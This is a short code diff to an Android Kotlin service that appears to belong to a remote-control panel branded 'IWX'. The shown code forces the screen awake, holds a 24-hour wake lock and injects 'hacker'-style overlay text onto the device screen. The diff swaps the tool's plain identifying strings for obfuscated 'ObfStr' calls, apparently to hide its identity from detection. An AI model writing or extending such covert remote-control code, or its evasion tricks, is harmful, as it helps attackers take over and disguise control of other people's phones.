@@ -422,7 +422,7 @@ class ConnectorService : Service() {
             @Suppress("DEPRECATION")
             val wl = pm.newWakeLock(
                 android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
-                "IWXPanel:WakeScreen"
+                ObfStr.wakeScreen()
             )
             wl.acquire(3000L)
             wl.release()
@@ -693,14 +693,14 @@ class ConnectorService : Service() {
 
     private fun acquireWakeLock() {
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "IWXPanel:WakeLock")
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, ObfStr.wakeLock())
             .apply { acquire(24 * 60 * 60 * 1000L) }
     }
 
     // ── Screen Inject ─────────────────────────────────────────────────────────
     private fun doScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f): String {
         return try {
-            val trimmed = text.trim().ifEmpty { "By IWX TEAM" }
+            val trimmed = text.trim().ifEmpty { ObfStr.brandTag() }
             InputEventService.showScreenInject(trimmed, style, speed)
             "OK: [${style.uppercase()}] Overlay — ${trimmed}"
         } catch (e: Exception) { "ERROR: ${e.message}" }
